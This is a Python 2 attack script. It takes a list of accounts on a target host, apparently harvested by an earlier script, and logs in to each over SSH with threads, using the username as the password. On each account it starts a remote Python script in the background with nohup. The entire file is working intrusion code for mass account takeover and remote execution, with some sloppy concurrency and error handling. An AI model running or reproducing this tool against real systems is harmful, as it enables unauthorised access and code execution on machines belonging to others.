import pxssh
import optparse
import os
import time
from threading import *

maxConnections = 20
connection_lock = BoundedSemaphore(value=maxConnections)

#dictionary_location = '/home/chaos/dictionary.txt'
script_location = '/home/chaos/remote_python_script.py'

def connect(host, user, password):

	for i in range(1,10):
		try:
			s = pxssh.pxssh()
			s.login(host, user, password)
			print '[+] Connection to ' + user + ' successful\n'
			return s
		except Exception, e:
			pass


def execute_them(host, user, user_number):
	
	session = connect(host, user, user)
	session.sendline('nohup python ' + script_location + ' -n ' + str(user_number) + ' &')
	time.sleep(2)
	session.logout()

def main():
	parser = optparse.OptionParser('usage prog -H <target host> -P <username:password> file')
	parser.add_option('-H', dest='tgthost', type='string', help='specify target host')
	parser.add_option('-P', dest='usrsfile', type='string', help='enter user:passwords file location') # this file is 
	# created automatically after execution of the previous script (same_psw_retreiver.py)
	(options, args) = parser.parse_args()
	
	host = options.tgthost
	users_file = options.usrsfile

	if host == None or users_file == None:
		print parser.usage
		exit(0)
	
	users = []
	usernames = open(users_file, 'r')
	for line in usernames.readlines():
		users.append(line.strip('\n'))
	
	print users

	for user in users:
		connection_lock.acquire()
		t = Thread(target=execute_them, args=(host, user, users.index(user))) 
		child = t.start()
		connection_lock.release()



if __name__ == '__main__':
	main()